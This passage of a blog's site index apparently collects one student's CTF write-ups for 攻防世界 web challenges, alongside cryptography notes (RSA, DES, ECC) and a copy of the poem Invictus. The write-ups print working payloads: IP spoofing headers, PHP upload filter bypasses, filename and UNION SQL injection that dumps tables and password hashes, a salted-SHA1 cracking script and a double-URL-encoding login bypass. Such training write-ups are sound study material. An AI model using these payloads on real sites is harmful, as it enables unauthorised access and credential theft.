o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _ **match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。(应该是从var后的几个值中挑选几个，组合得到flag)** 实际操作： 方法一：审计，变量e需要满足五个条件。长度为16；^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求；所以可以构造出：e==be0f233ac7be98aa在OK输入框中输入可以得到flag； 方法二：由于程序已经固定只是在输入时需要检测是否匹配，那么可以直接省去输入匹配部分，直接执行关键组合flag部分；提取如下代码，在控制台执行： 123456789101112131415161718function $()&#123; var e=document.getElementById(\"c\").value; &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _ bug题目分析：给出一个登录页面;首先随便注册一个用户； 登录； 发现只有Manage是不能普通用户使用的； 最后发现还有个Finpwd，找回密码之前应该会验证身份，应该是突破口； 实际操作：先以smtsec找回密码，发现直接给了一个newpwd输入框；应该是需要抓包修改用户身份； 修改为admin，提示修改成功； 以admin身份登录成功；但是Manage还是不能使用提示IP not allowed!应该要改为本地登录；在请求头中加入X-Forwarded-For: 127.0.0.1进行ip伪造；得到如下页面； 查看源码，看到提示： 看到filemanage想到可能do为upload(文件管理无非上传、下载、查看、删除)； 关于文件上传：https://blog.csdn.net/qq_42636435/article/details/88096844 根据提示Just image？因该是上传image然后改后缀； 构造： 123&lt;？php phpinfo();？&gt; 上传发现，过滤了;不是php文件又不能进行解析得到响应；非php文件下提示要上传php文件；It is not a really php file这里尝试使用php的脚本表达形式 123&lt;script language='php'&gt;phpinfo();&lt;/script&gt; 将jpg后缀改为php4/php5;(否则不能解析)就得到响应flag了. upload初探 根据题目upload猜测可能为文件上传漏洞，先注册为会员(username:111111;password:111111); 登录就出现了上传文件的页面如下： 尝试上传文件，发现只有jpg格式的文件可以上传尝试上传php.jpg 1&lt;?php echo phpinfo();?&gt; burpsuite抓包改后缀名为php得到结果回应为文件格式错误，应该是服务器端的检查，而非客户端Js过滤； 分析：题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析； 参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；*后端插入语句： 12INSERT INTO 表名VALUES（被插入新行中的值） 实际操作： 构造payload：（文件名）1'+(select database())+'.jpg 可以看到select被过滤了，尝试双写绕过： 1'+(selselectect database())+'.jpg 页面回显均为0； 尝试转换格式：转为16进制：1'+(selselectect hex(database()))+'.jpg 页面回显为：7765625 分析(回显16进制为纯数字，可能过滤字母；且可能回显位不全)转10进制输出:1'+(selselectect conv(hex(database()),16,10))+'.jpg *MySQL CONV（）将一个数字从一个数字基数系统转换为另一个数字基数系统。转换后，函数返回数字的字符串表示形式。当定义的参数为NULL时，返回值将为NULL。最小基数为2，最大基数为36.如果要转换的基数为负数，则该数字被视为带符号数。否则，它被视为未签名。该函数出现在MySQL版本：5.6语法： 1CONV(N,from_base,to_base) 页面回显为：1.8446744073709552e19 分析(回显科学计数法，应该是输出位数过长)使用substr分割输出：1'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg 页面回显为：131277325825392 转16进制再转为ascll,得到：web_up123456789def changeascll(number): number=str(hex(number))[2:] s1=[number[i:(i+2)]for i in range(0,len(number),2)] s2=[int(i,16)for i in s1] s3=[chr(i)for i in s2] s=\"\".join(s3) print(s)changeascll(131277325825392) 提取后半部分字符：1819238756 1'+(selselectect conv(substr(hex(database()),13,12),16,10))+'.jpg 得到数据库名：web_upload 同样使用上述方法爆表payload：1'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'.jpg 114784820031327112615676665705126853610566245得到表名：hello_flag_is_here 爆字段payload:1'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg 1158583773673987102823得到字段名：i_am_flag 爆值payload：1'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg 3642721569519992806431727430560750951 得到值：1!!_@m_Th.e_F!lag web2题目分析：根据题目要求需要解密； 12345678910111213141516171819202122232425262728293031&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str)&#123; $_o=strrev($str);//strrev() 函数反转字符串;语法:strrev(string) // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1);//从$_0位置开始，返回1个字符//substr() 函数返回字符串的一部分。//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。语法substr(string,start,length)//用于提取字符串的一部分，即返回字符串的子串。 $__=ord($_c)+1;//ord() 函数返回字符串的首个字符的 ASCII 值。 $_c=chr($__);//chr() 函数从指定的 ASCII 值返回字符。//ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。 $_=$_.$_c;//拼接 &#125; return str_rot13(strrev(base64_encode($_)));//返回ROT13 编码(反转字符串(base64加密($_)))的结果//ROT13一种简易的替换式密码&#125;highlight_file(__FILE__);/* 逆向加密算法，解密$miwen就是flag*/?&gt; 实际操作：分析代码，可知加密流程为： 对flag字符串反转 截取每一个字符，转ascll+1,再转为字符，拼接 base64加密，反转加密和的字符串，ROT13编码则可得解密算法：12345678910111213141516&lt;?php$str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$_ = base64_decode(strrev(str_rot13($str)));$_o=NULL;for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o);?&gt; php2题目分析：打开链接只有一句：Can you anthenticate to this website?尝试访问index.php，失败；访问index.phps,成功；得到以下源码： 12345678910111213&lt;?phpif(\"admin\"===$_GET[id]) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";&#125;?&gt; 分析代码： 要使”admin”===$_GET[id]不成立 $_GET[id] = urldecode($_GET[id]);url编码后使得$_GET[id] == “admin”成立 实际操作：方案：通过url转码实现，因为浏览器要转一次，故我们进行二次转码；n的url编码为：%6e;%的url编码为%25构造：admi%256e 1http://111.198.29.45:35463/?id=admi%256e","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"RSA算法分析","slug":"RSA算法分析","date":"2019-12-24T08:49:29.000Z","updated":"2019-12-24T09:17:40.535Z","comments":true,"path":"2019/12/24/RSA算法分析/","link":"","permalink":"https://singlemindedt.github.io/2019/12/24/RSA算法分析/","excerpt":"","text":"快速幂算法 加解密都用到了幂运算 1234567891011def FastMod(x, n, m): a = 1 b = x while True: temp = n if n % 2 == 1 : a = a * b % m b = b * b % m n = n//2 if temp &lt; 1 : return a 生成n位的素数产生的素数越大，安全性越好 1234567891011def genPrime(b=1024): while True: # the highest bit is 1 ans = \"1\" for i in range(b-2): ans += str(random.randint(0,1)) # the lowest bit is 1 ans += \"1\" ans = int(ans,2) if miller_rabin(ans): return ans","categories":[],"tags":[]},{"title":"安装gmpy2","slug":"安装gmpy2","date":"2019-12-23T03:44:56.000Z","updated":"2019-12-23T23:40:15.006Z","comments":true,"path":"2019/12/23/安装gmpy2/","link":"","permalink":"https://singlemindedt.github.io/2019/12/23/安装gmpy2/","excerpt":"","text":"在Windows上安装需要非官方的预编译二进制文件，网址：https://www.lfd.uci.edu/~gohlke/pythonlibs/找GMPY，是按照字母序排的，选择适合自己版本的gmpy2的whl文件进行下载，我选的：gmpy2‑2.0.8‑cp38‑cp38‑win_amd64.whl保存在了E盘，安装： PyCharm读取本地包：右击pycharm中项目管理器中本项目目录下的venv文件夹，单击在资源管理器中打开；用记事本打开pyvenv.cfg，将里面的include-system-site-packages = false改为include-system-site-packages = true；重启； 本项目有效，其它还得改pyvenv.cfg","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"Python","slug":"notes/Python","permalink":"https://singlemindedt.github.io/categories/notes/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://singlemindedt.github.io/tags/Python/"}]},{"title":"php2","slug":"php2","date":"2019-12-21T02:51:21.000Z","updated":"2019-12-30T06:10:07.045Z","comments":true,"path":"2019/12/21/php2/","link":"","permalink":"https://singlemindedt.github.io/2019/12/21/php2/","excerpt":"","text":"php2题目分析：打开链接只有一句：Can you anthenticate to this website?尝试访问index.php，失败；访问index.phps,成功；得到以下源码： 12345678910111213&lt;?phpif(\"admin\"===$_GET[id]) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";&#125;?&gt; 分析代码： 要使”admin”===$_GET[id]不成立 $_GET[id] = urldecode($_GET[id]);url编码后使得$_GET[id] == “admin”成立 实际操作：方案：通过url转码实现，因为浏览器要转一次，故我们进行二次转码；n的url编码为：%6e;%的url编码为%25构造：admi%256e 1http://111.198.29.45:35463/?id=admi%256e","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"web2","slug":"web2","date":"2019-12-21T01:44:24.000Z","updated":"2019-12-30T06:07:46.353Z","comments":true,"path":"2019/12/21/web2/","link":"","permalink":"https://singlemindedt.github.io/2019/12/21/web2/","excerpt":"","text":"web2题目分析：根据题目要求需要解密； 12345678910111213141516171819202122232425262728293031&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str)&#123; $_o=strrev($str);//strrev() 函数反转字符串;语法:strrev(string) // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1);//从$_0位置开始，返回1个字符//substr() 函数返回字符串的一部分。//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。语法substr(string,start,length)//用于提取字符串的一部分，即返回字符串的子串。 $__=ord($_c)+1;//ord() 函数返回字符串的首个字符的 ASCII 值。 $_c=chr($__);//chr() 函数从指定的 ASCII 值返回字符。//ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。 $_=$_.$_c;//拼接 &#125; return str_rot13(strrev(base64_encode($_)));//返回ROT13 编码(反转字符串(base64加密($_)))的结果//ROT13一种简易的替换式密码&#125;highlight_file(__FILE__);/* 逆向加密算法，解密$miwen就是flag*/?&gt; 实际操作：分析代码，可知加密流程为： 对flag字符串反转 截取每一个字符，转ascll+1,再转为字符，拼接 base64加密，反转加密和的字符串，ROT13编码则可得解密算法：12345678910111213141516&lt;?php$str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$_ = base64_decode(strrev(str_rot13($str)));$_o=NULL;for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o);?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"不可征服","slug":"不可征服","date":"2019-12-20T13:38:09.000Z","updated":"2019-12-20T14:20:49.046Z","comments":true,"path":"2019/12/20/不可征服/","link":"","permalink":"https://singlemindedt.github.io/2019/12/20/不可征服/","excerpt":"","text":"《不可征服》 作者：威廉亨利 透过覆盖我的夜色, 我看见黑暗层层叠叠。 我感谢上天赐予我, 不可征服的灵魂。 就算被地狱紧紧拽住, 我也从未退避哀求。 遭受命运的重重打击， 我满头鲜血，却头颅高昂。 在愤怒和悲伤的尘世外, 耸立的不过是恐怖的影子, 面对未来的威胁, 我无所畏惧。 无论命运之门多么狭窄， 无论承受怎样的惩罚， 我是我命运的主宰, 我是我灵魂的统帅。 Invictus Out of the night that covers me Black as the pit from pole to pole I thank whatever gods may be For my unconquerable soul In the fell clutch of circumstance I have not winced nor cried aloud Under the bludgeonings of chance My head is bloody,but unbowed. Beyond this place of wrath and tear Looms but the Horror of the shade And yet the menace of the years Finds,and shall find,me unafraid It matters not how strait the gate How charged with punishments the scroll I am the master of my fate I am the captain of my soul.","categories":[{"name":"essay","slug":"essay","permalink":"https://singlemindedt.github.io/categories/essay/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://singlemindedt.github.io/tags/essay/"}]},{"title":"公钥密码体制","slug":"公钥密码体制","date":"2019-12-19T08:15:45.000Z","updated":"2020-01-01T16:44:00.645Z","comments":true,"path":"2019/12/19/公钥密码体制/","link":"","permalink":"https://singlemindedt.github.io/2019/12/19/公钥密码体制/","excerpt":"","text":"原因对称加密体制的不足： 密钥的分配和管理 签名和认证 公钥加密体制1.发送方A查找接收方B的公钥 A采用公钥加密算法以B的公钥加密明文消息 A通过不安全信道将密文发送给B B收到密文后用自己的私钥解密获取明文 关键：单向陷门函数单向陷门函数𝒇： 给出𝑓定义域中的任意元素𝑥,计算𝑓(𝑥)是容易的 给出𝑦=𝑓(𝑥)中的𝑦，计算𝑥： 若知道设计函数𝑓时结合进去的某种信息（称为陷门），则𝑥容易计算； 若不知道该陷门信息，则𝑥难以计算一个公钥密码应满足： 解密算法D与加密算法E互逆，即对于所有明文𝑀都有，𝑫(𝑬(𝑴,𝑲𝒆),𝑲𝒅)＝𝑴 由𝐾𝑒求出𝐾𝑑在计算上不可行 算法E和D都是高效的 RSA安全性基于大整数因子分解的困难性 RSA算法描述 例子 素数的生成一般的，选取一个素数的过程如下： 随机选一个奇数𝑛(如使用伪随机数产生器) 用某种概率性算法（如Miller-Rabin算法）对n进行一次素性检验，如果𝑛没有通过检验，转到步骤1 重复步骤2足够多次，如果𝑛都通过了检测，则认为𝑛为素数RSA的实现 例子 RSA的安全性 保密p,q已知p,q,由Euler函数φ(𝑛)=(𝑝−1)(𝑞−1)，也就可以利用欧几里得除法，根据𝑒𝑑≡1 (𝑚𝑜𝑑 φ(𝑛)), 由𝑒求出𝑑 依赖于大数分解问题 对RSA的攻击* 针对𝒏分解的攻击 循环攻击 同模攻击 选择密文攻击 低加密指数攻击 时间攻击 使用RSA体制时必须注意问题： 选择素数𝑝和𝑞时，应使其欧拉函数φ(𝑝)和φ(𝑞)的最小公倍数尽可能大(φ(𝒑)和φ(𝒒) 有大的素因子)。最小公倍数越大，幂剩余函数的周期就越长—避免循环攻击 密钥中的各项参数应选得足够大—避免穷举攻击 在同一个通信网络中，不同的用户不应该使用共同的模数n—避免同模攻击 公钥密码体制ElGamal基于离散对数问题 算法描述1.密钥生成选取大素数𝑝，𝑔∈〖𝑍_𝑝〗^∗是一个生成元，𝑝,𝑔 作为系统参数所有用户共享 系统中每个用户U都随机挑选整数𝑥，2≤𝑥≤ 𝑝－2，并计算： 𝑦=𝑔^𝑥(𝑚𝑜𝑑 𝑝)， 𝑦作为用户U的公钥，而𝑥作为用户U的私钥 2.加密 用户A先把明文𝑀编码为一个在 0 到𝑝－1之间的整数𝑚； 用户A挑选一个秘密随机数 𝑟 ( 2≤ 𝑟 ≤ 𝑝－2 )，并计算：𝑐1＝ 𝑔^𝑟 (𝑚𝑜𝑑 𝑝)；𝑐2 ＝ 𝑚∙𝑦^𝑟(𝑚𝑜𝑑 𝑝) 用户A把二元组 (𝒄𝟏 ,𝒄𝟐) 作为密文传送给用户B3.解密用户B接收到密文二元组(𝑐1 ,𝑐2)后，做解密计算：𝒎=𝒄𝟐∙(𝒄𝟏^𝒙 )^(−𝟏) 𝒎𝒐𝒅 𝒑 4.ElGamal算法特点： 非确定性：由于密文依赖于加密过程中用户A选择的随机数𝑟 ，所以加密相同的明文可能会产生不同的密文—概率加密 密文空间大于明文空间：明文空间为〖𝑍_𝑝〗^∗，而密文空间为〖𝑍_𝑝〗^∗×〖𝑍_𝑝〗^∗ElGamal的安全性 公钥密码体制ECC(椭圆曲线密码体制)基于椭圆曲线离散对数问题可用更短的密钥获得同RSA一样的安全性 椭圆曲线上的运算 𝒪 称为加法单位元，对ECC上任意点𝑃：𝑃＋𝒪 ＝𝑃 加法逆元：ECC上的点𝑃 的加法逆元−𝑷定义为：具有相同 𝒙 坐标和负𝒚 坐标的点，即过𝑃点的垂线与曲线相交的另外一点 对ECC上𝑥 坐标不同的两点𝑃、𝑄，点加𝑷+𝑸定义为：连接𝑃和𝑄的直线和曲线相交于点𝑅，则𝑃+𝑄的值为𝑅的加法逆元 倍点𝑷+𝑷运算定义：做点𝑃的切线，设切线与ECC交于点𝑅，则倍点为𝑅的逆元，即：2𝑃 =𝑃+𝑃= −𝑅 类似：𝑘𝑃=𝑃+𝑃+𝑃+…+𝑃 有限域上椭圆曲线加法 椭圆曲线密码算法1.密钥对生成2.加密算法3.解密算法小结 公钥体制的问题缺少身份认证机制==&gt;基于身份的加密体制IBE 公钥密码体制的安全性公钥密码的优点（与对称密码相比） 密钥分发简单 需秘密保存的密钥量少 可以满足互不认识的人之间私人谈话的保密性 可以实现数字签名和认证的功能 公钥密码的不足（与对称密码相比） 公钥密码算法比对称密码算法慢 公钥密码算法提供更多的信息对算法进行攻击，如公钥密码算法对选择明文攻击是脆弱的，尤其明文集比较小时 数据扩展 公钥密码算法一般是建立在特定的数学难题之上，往往这种困难性只是一种设想 #补充 解决对称加密和公钥加密中的不足-混合加密","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"密码学","slug":"notes/密码学","permalink":"https://singlemindedt.github.io/categories/notes/密码学/"}],"tags":[]},{"title":"分组密码","slug":"分组密码","date":"2019-12-18T08:28:39.000Z","updated":"2019-12-20T01:28:23.523Z","comments":true,"path":"2019/12/18/分组密码/","link":"","permalink":"https://singlemindedt.github.io/2019/12/18/分组密码/","excerpt":"","text":"概念将明文划分成长为𝑚(如𝑚=64或128)的分组𝑃＝(𝑝0, 𝑝1, 𝑝2, ….,𝑝(𝑚−1))，各明文分组分别在长为t的密钥𝐾＝(𝑘0, 𝑘1, 𝑘2, ….,𝑘(𝑡−1)) 的控制下变换成长为𝑛的密文分组𝐶＝(𝑐0, 𝑐1, 𝑐2, …,𝑐_(𝑛−1))。(一般 𝑚=𝑛) 特点速度快、安全性较高、易于标准化和便于软硬件实现构造伪随机数生成器、序列密码、消息认证码和Hash函数的方法 设计要求1.分组长度要足够大假设𝑛为分组长度，则要使2𝑛足够大，防止明文穷举攻击2.密钥量要足够大防止密钥穷举攻击3.密码变换要足够复杂使攻击者除穷举攻击外，找不到其他简洁的数学攻击方法4.加密和解密运算简单便于软件和硬件的实现5.无数据扩展和压缩 设计思想扩散扩散原则（移位）：密钥或明文的每一比特变化影响密文的许多比特的变化，以便隐蔽明文的统计特性(形象的称为雪崩效应) 混淆混淆原则（替代）：又称混乱原则，指密钥和明文以及密文之间的依赖关系尽可能的复杂化，以防通过统计分析法进行破译（混乱必须是可逆的！） 原理乘积密码扩散和混乱两种基本密码操作的组合变换(乘积密码) 乘积密码的实现—SPN网络S变换起混淆的作用； P变换起扩散的作用SPN具有雪崩效应：输入(明文或密钥)即使只有很小的变化，也会导致输出有很大的变化 分组密码算法DES###算法描述^-^:(1) DES的加密流程图 初始置换IP和初始逆置换IP-1(如原来第58位的数据置换后放在第1位) 16轮迭代在每轮迭代中，64位的中间结果被分成左右两部分，且作为相互独立的32位数据进行处理。每轮迭代的输入是上轮的结果𝐿𝑖－1和𝑅𝑖－1 加密函数F E扩展置换E-扩展：32比特扩展为48比特 扩展方法：每个输入分组的4位作为6位输出分组的中间4位，6位输出分组中的第1、6位分别由相邻两个4位分组的最外面两位扩散进入到本分组，其中第1个分组的左侧相邻分组为最后1个分组 ###与子密钥异或将E盒扩展得到的48位输出与子密钥𝐾𝑖进行异或运算 压缩替换S-盒：由8个S-盒构成, 每个S-盒都是6比特的输入，4比特的输出𝑠𝑖(ℎ1ℎ2ℎ3ℎ4ℎ5ℎ6)的值是对应表𝑠𝑖中(ℎ1ℎ6)行和(ℎ2ℎ3ℎ4ℎ5)列上的值 S-盒的构造（计算题） P-置换P-置换对8个S-盒的输出进行变换 DES的解密过程 DES子密钥生成DES子密钥是从初始密钥(种子密钥)产生的 种子密钥𝐾为64位，其中有8位用于奇偶校验，分别位于第8，16，24，32，40，48，56，64位 奇偶校验位用于检查密钥𝐾在产生和分配以及存储过程中可能发生的错误 DES的密钥实际上只有56位* DES的安全性 对DES的S盒、迭代次数、密钥长度等设计准则的争议 DES存在一些弱密钥和半弱密钥 DES的56位密钥无法抵抗穷举攻击 代数结构存在互补对称性弱密钥 给定初始密钥𝑲生成子密钥时，将种子密钥（去除了奇偶校验位后）分成两个部分，如果𝑲使得这两部分的每一部分的所有位置全为0或1，则经子密钥产生器产生的各个子密钥都相同，即𝑲𝟏=𝑲𝟐=…=𝑲𝟏𝟔，则称密钥𝑲为弱密钥（共有4个） 若𝑲为弱密钥，则对任意的64比特信息有：***𝑬𝒌(𝑬𝒌(𝒎))= 𝒎 和 𝑫𝒌(𝑫𝒌(𝒎))= 𝒎*** 半弱密钥 半弱密钥：把明文加密成相同的密文，即存在两个不同的密钥𝒌和𝒌′,使得𝑬𝒌 (𝒎)=𝑬(𝒌^′ ) (𝒎) 具有下述性质：若𝒌和𝒌′为一对弱密钥，𝒎为明文组，则有： 𝑬(𝒌^′ ) (𝑬_𝒌 (𝒎))=𝑬_𝒌 (𝑬(𝒌^′ ) (𝒎))=𝒎*互补性 对明文𝒎逐位取补，记为𝒎 ̅，密钥𝑲逐位取补，记为𝒌 ̅ ， 若𝒄=𝑬𝒌(𝒎)，则有𝒄 ̅=𝑬_𝒌 ̅ (𝒎 ̅) ，称为算法上的互补性由算法中两次异或运算的配置决定：两次异或运算一次在S盒之前，一次在P盒置换之后 若对DES 的明文和密钥同时取补，则扩展运算E的输出和子密钥产生器的输出也都取补，因而经异或运算后的输出和未取补时的输出一样，即到达S盒的输入数据未变，输出自然也不变，但经第二个异或运算时，由于左边数据已取补，因而输出也就取补 互补性使DES在选择明文攻击下所需的工作量减半 多重DES3DES AES","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"密码学","slug":"notes/密码学","permalink":"https://singlemindedt.github.io/categories/notes/密码学/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"baby_web+FlatScience","slug":"baby-web","date":"2019-12-18T00:36:20.000Z","updated":"2019-12-30T05:00:31.351Z","comments":true,"path":"2019/12/18/baby-web/","link":"","permalink":"https://singlemindedt.github.io/2019/12/18/baby-web/","excerpt":"","text":"[TOC] baby_web题目提示：想想初始页面是哪个 实际操作：考虑到可能是页面302重定向抓包得到flag FlatScience实际操作点进去有好多链接，下载PDF，跳回等； 查看robots.txt(robots.txt:是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。)访问:http://111.198.29.45:34978/robots.txt 123User-agent: *Disallow: /login.phpDisallow: /admin.php 访问login.php:得到了一个登陆页面，尝试sqli,提示： 12Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: \"2801497d9ca18eef4382b18d1889b8bc97e28461\" in /var/www/html/login.php on line 47Some Error occourred! 可以看到使用的是SQLite数据库,还有加密操作？ 访问网页源码： 有参数提示debug;尝试访问login.php?debug得到如下php代码： 1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST['usr']) &amp;&amp; isset($_POST['pw']))&#123; $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\"); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo \"&lt;br&gt;Some Error occourred!\"; &#125; if(isset($row['id']))&#123; setcookie('name',' '.$row['name'], time() + 60, '/'); header(\"Location: /\"); die(); &#125;&#125;if(isset($_GET['debug']))highlight_file('login.php');?&gt; 可以看到SQL的查询语句，并且对密码进行了加密操作(sha1+salt&lt;=（alz！）);页面注入不成，抓包分析下：构造： 1usr='union select name,sql from sqlite_master--+n&amp;pw=233 得到： 1Set-Cookie: name=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; URL编码转换一下：%27=&gt;’;%28=&gt;(;%29=&gt;); 12CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)) 看到Users表、id,name,password.hint字段；构造查询语句： 12345idusr='union select id,id from Users limit 0,1--&amp;pw=233usr='union select id,id from Users limit 1,1--&amp;pw=233usr='union select id,id from Users limit 2,1--&amp;pw=233得到3个id； 1234usr='union select id,name from Users limit 0,1--&amp;pw=233usr='union select id,name from Users limit 1,1--&amp;pw=233usr='union select id,name from Users limit 2,1--&amp;pw=233得到name：admin、fritze、hansi 1234567usr='union select id,password from Users limit 0,1--&amp;pw=233usr='union select id,password from Users limit 1,1--&amp;pw=233usr='union select id,password from Users limit 2,1--&amp;pw=233得到password：3fab54a50e770d830c0416df817567662a9dc85c54eae8935c90f467427f05e4ece82cf569f8950734b0bb7c304949f9ff2fc101eef0f048be10d3bd 1234567usr='union select id,hint from Users limit 0,1--&amp;pw=233usr='union select id,hint from Users limit 1,1--&amp;pw=233usr='union select id,hint from Users limit 2,1--&amp;pw=233得到hint：my+fav+word+in+my+fav+paper%3F%21my+love+is%E2%80%A6%3Fthe+password+is+password 根据admin用户的提示my fav word in my fav paper？！应该是：密码+”Salz!”做sha1处理，密码应该就产生于pdf中； 因为我门知道了加密结果直接解密去掉Salz就得到密码了： 解密 也可以用pdf中的单词进行+Salz!再做sha1； 借用一下别人的Python脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041from cStringIO import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlib def get_pdf(): return [i for i in os.listdir(\"./\") if i.endswith(\"pdf\")] def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, 'rb') as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return text def find_password(): pdf_path = get_pdf() for i in pdf_path: print \"Searching word in \" + i pdf_text = convert_pdf_2_text(i).split(\" \") for word in pdf_text: sha1_password = hashlib.sha1(word+\"Salz!\").hexdigest() if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c': print \"Find the password :\" + word exit() if __name__ == \"__main__\": find_password() 知识补充‘’’os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。它不包括 . 和 .. 即使它在文件夹中。只支持在 Unix, Windows 下使用。语法listdir()方法语法格式如下：os.listdir(path)参数:path – 需要列出的目录路径返回值:返回指定路径下的文件和文件夹列表。‘’’‘’’endswith() 方法用于判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回True，否则返回False。可选参数”start”与”end”为检索字符串的开始与结束位置。‘’’‘’’hashlib是涉及安全散列和消息摘要，提供多个不同的加密算法接口，如SHA1、SHA224、SHA256、SHA384、SHA512、MD5等。其中hash.digest()返回摘要，作为二进制数据字符串值hash.hexdigest()返回摘要，作为十六进制数据字符串值‘’’ 得到密码：ThinJerboa访问：admin.php 12username=adminpassword=ThinJerboa 